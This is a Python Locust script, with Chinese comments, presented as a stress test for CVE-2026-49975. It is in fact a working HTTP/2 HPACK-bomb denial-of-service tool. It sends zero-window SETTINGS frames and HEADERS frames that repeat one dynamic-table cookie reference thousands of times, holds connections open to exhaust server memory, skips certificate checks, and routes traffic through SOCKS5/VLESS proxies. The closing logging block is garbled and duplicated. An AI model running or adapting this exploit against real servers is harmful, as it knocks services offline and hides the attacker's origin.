#!/usr/bin/env python3
"""
CVE-2026-49975 专用压测脚本
============================
支持 SOCKS5 / HTTP 代理
支持通过 VLESS (xray-core) 转发的本地 SOCKS5 代理

环境变量:
  SOCKS5_PROXY     : SOCKS5 代理地址, 如 socks5://127.0.0.1:10808
  HTTP_PROXY       : HTTP 代理地址
  HTTPS_PROXY      : HTTPS 代理地址
  LOCUST_REFERENCES: HPACK 引用次数 (默认: 2048)
  LOCUST_HOLD_SECONDS: 连接保持秒数 (默认: 15)
  LOCUST_STREAMS   : 每个连接的流数 (默认: 1)
  SOCKS5_USER      : SOCKS5 用户名
  SOCKS5_PASS      : SOCKS5 密码

使用示例:
  # 直连测试
  locust -f locustfile.py --host https://your-target.com \
    --headless -u 100 -r 50 --run-time 5m

  # 通过 xray 转发的 VLESS 代理测试
  SOCKS5_PROXY=socks5://127.0.0.1:10808 \
  locust -f locustfile.py --host https://your-target.com \
    --headless -u 100 -r 50 --run-time 5m
"""

from locust import User, task, constant, events
import socket
import ssl
import struct
import time
import logging
import os

logger = logging.getLogger(__name__)

# ============================================================
# 配置参数
# ============================================================

REFERENCES = int(os.environ.get("LOCUST_REFERENCES", "2048"))
HOLD_SECONDS = int(os.environ.get("LOCUST_HOLD_SECONDS", "15"))
STREAMS = int(os.environ.get("LOCUST_STREAMS", "1"))

SOCKS5_PROXY = os.environ.get("SOCKS5_PROXY", "").strip()
HTTP_PROXY = os.environ.get("HTTP_PROXY", "").strip()
HTTPS_PROXY = os.environ.get("HTTPS_PROXY", "").strip()
PROXY_URL = SOCKS5_PROXY or HTTP_PROXY or HTTPS_PROXY or ""

# 尝试导入 PySocks
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    if PROXY_URL:
        logger.warning("PySocks 未安装，代理功能不可用。请运行: pip install PySocks")


def parse_proxy(proxy_url):
    """解析代理 URL 返回 (proxy_type, host, port)"""
    if not proxy_url:
        return None, None, None

    proxy_url = proxy_url.strip()

    if "://" not in proxy_url:
        if SOCKS_AVAILABLE:
            parts = proxy_url.rsplit(":", 1)
            return socks.SOCKS5, parts[0].strip(), int(parts[1])
        return None, None, None

    if proxy_url.startswith("socks5://"):
        if not SOCKS_AVAILABLE:
            return None, None, None
        proxy_type = socks.SOCKS5
        rest = proxy_url[8:]
    elif proxy_url.startswith("socks4://"):
        if not SOCKS_AVAILABLE:
            return None, None, None
        proxy_type = socks.SOCKS4
        rest = proxy_url[9:]
    elif proxy_url.startswith("http://") or proxy_url.startswith("https://"):
        proxy_type = "http"
        rest = proxy_url.split("://", 1)[1]
    else:
        logger.warning("未知的代理协议: " + proxy_url)
        return None, None, None

    if "@" in rest:
        rest = rest.split("@")[-1]

    if ":" in rest:
        host, port_str = rest.split(":", 1)
        port = int(port_str.split("/")[0])
    else:
        host = rest
        port = 1080

    return proxy_type, host, port


def create_connection_with_proxy(address, timeout=None, proxy_params=None):
    """建立 TCP 连接，支持 SOCKS5 代理"""
    proxy_type, proxy_host, proxy_port = proxy_params or (None, None, None)

    if proxy_type and SOCKS_AVAILABLE:
        if proxy_type in (socks.SOCKS5, socks.SOCKS4):
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(
                proxy_type,
                proxy_host,
                proxy_port,
                username=os.environ.get("SOCKS5_USER", ""),
                password=os.environ.get("SOCKS5_PASS", ""),
            )
            if timeout:
                sock.settimeout(timeout)
            sock.connect(address)
            return sock

    return socket.create_connection(address, timeout=timeout)


PROXY_PARAMS = parse_proxy(PROXY_URL)

# ============================================================
# HTTP/2 帧构建
# ============================================================

CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
SETTINGS_FRAME_TYPE = 0x04
HEADERS_FRAME_TYPE = 0x01


def build_frame(frame_type, flags, stream_id, payload):
    """构建 HTTP/2 帧"""
    length = len(payload)
    result = struct.pack(">I", length)[1:]
    result += struct.pack("BB", frame_type, flags)
    result += struct.pack(">I", stream_id & 0x7FFFFFFF)
    result += payload
    return result


def build_settings(initial_window_size=0, max_frame_size=16384):
    """构建 SETTINGS 帧，关闭流量控制窗口"""
    payload = struct.pack(">HI", 0x04, initial_window_size)
    payload += struct.pack(">HI", 0x05, max_frame_size)
    return build_frame(SETTINGS_FRAME_TYPE, 0x00, 0, payload)


def build_headers_frame(stream_id, indexed_references=2048):
    """
    构建 HPACK 炸弹 HEADERS 帧
    1. 插入 255 字节 cookie header 到动态表
    2. 重复引用同一索引放大内存
    """
    name = b"cookie"
    value = b"a" * 255

    # Literal Header Field with Incremental Indexing
    insert_prefix = bytes([0x40, len(name)])
    insert_prefix += name
    insert_prefix += bytes([len(value)])
    insert_prefix += value

    # Indexed Header Field - 动态表索引 62
    indexed_ref = bytes([0xBE])

    payload = insert_prefix + indexed_ref * indexed_references
    return build_frame(HEADERS_FRAME_TYPE, 0x04 | 0x01, stream_id, payload)


# ============================================================
# 用户类
# ============================================================

class Http2BombUser(User):
    """HTTP/2 HPACK 炸弹攻击用户"""

    wait_time = constant(0)

    references_per_stream = REFERENCES
    streams_per_connection = STREAMS
    hold_seconds = HOLD_SECONDS

    _ssl_ctx = None

    @classmethod
    def _get_ssl_ctx(cls):
        """获取或创建 SSL 上下文"""
        if cls._ssl_ctx is None:
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            cls._ssl_ctx = ctx
        return cls._ssl_ctx

    def _parse_host(self):
        """解析目标主机信息"""
        host = self.host or "https://127.0.0.1"

        if host.startswith("https://"):
            rest = host[8:]
            use_tls = True
            default_port = 443
        elif host.startswith("http://"):
            rest = host[7:]
            use_tls = False
            default_port = 80
        else:
            rest = host
            use_tls = True
            default_port = 443

        if ":" in rest:
            parts = rest.split(":", 1)
            hostname = parts[0]
            port_str = parts[1].split("/")[0]
            port = int(port_str)
        else:
            hostname = rest.split("/")[0]
            port = default_port

        return hostname, port, use_tls

    @task
    def http2_bomb_attack(self):
        """执行一次 HTTP/2 HPACK 炸弹攻击"""
        hostname, port, use_tls = self._parse_host()
        sock = None
        start_time = time.time()
        exception = None

        try:
            # 建立 TCP 连接
            sock = create_connection_with_proxy(
                (hostname, port),
                timeout=10.0,
                proxy_params=PROXY_PARAMS,
            )

            # TLS 握手
            if use_tls:
                sock = self._get_ssl_ctx().wrap_socket(
                    sock,
                    server_hostname=hostname,
                )

            # 发送 HTTP/2 前言
            sock.sendall(CLIENT_PREFACE)

            # 发送 SETTINGS 帧（关闭流量控制窗口）
            sock.sendall(build_settings(initial_window_size=0))

            # 发送 HPACK 炸弹 HEADERS 帧
            for sid in range(1, 2 * self.streams_per_connection, 2):
                frame = build_headers_frame(sid, self.references_per_stream)
                sock.sendall(frame)

            # 保持连接存活，阻止内存释放
            if self.hold_seconds > 0:
                end_time = time.time() + self.hold_seconds
                while time.time() < end_time:
                    try:
                        sock.settimeout(1.0)
                        data = sock.recv(4096)
                        if not data:
                            break
                    except socket.timeout:
                        continue
                    except OSError:
                        break

        except Exception as e:
            exception = e

        finally:
            # 关闭连接
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

            # 上报请求统计
            total_time = int((time.time() - start_time) * 1000)

            if PROXY_URL:
                proxy_name = "proxy"
            else:
                proxy_name = "direct"

            request_name = "/ (refs=" + str(self.references_per_stream)
            request_name += ", hold=" + str(self.hold_seconds) + "s"
            request_name += ", via=" + proxy_name + ")"

            self.environment.events.request.fire(
                request_type="H2-BOMB",
                name=request_name,
                response_time=total_time,
                response_length=0,
                exception=exception,
                context={},
            )


# ============================================================
# 启动信息
# ============================================================

@events.init.add_listener
def on_test_start(environment, **kw):
    """测试启动时输出配置信息"""
    if PROXY_URL:
        proxy_display = PROXY_URL
    else:
        proxy_display = "直连"

    logger.info("=" * 60)
    logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
    logger.info("  并发用户数     : " + str(environment.runner.target_user_count))
    logger.info("  HPACK 引用次数 : " + str(REFERENCES))
    logger.info("  连接保持秒数   : " + str(HOLD_SECONDS))
    logger.info("  每连接流数     : " + str(STREAMS))
    logger.info("  目标地址       : " + str(environment.host))
    logger.info("  代理设置       : " + proxy_display)
    logger.info("  测试时长       : " + str(environment.runner.run_time) + "秒")
    logger.info("=" * 60)
    logger.info("  观察目标服务器内存:")
    logger.info("  $ watch -n 2 'ps aux | grep nginx | grep -v grep'")
    logger.info("=" * 60)   logger.info(f"  HPACK 引用次数     : {REFERENCES}")
    logger.info(f"  连接保持秒数       : {HOLD_SECONDS}")
    logger.info(f"  每连接流数         : {STREAMS}")
    logger.info(f"  目标地址           : {environment.host}")
    logger.info(f"  代理设置           : {proxy_display}")
    logger.info(f"  测试时长           : {environment.runner.run_time}秒")
    logger.info("=" * 60)
    logger.info("  观察目标服务器内存:")
    logger.info("  $ watch -n 2 'ps aux | grep nginx | grep -v grep'")
    logger.info("=" * 60)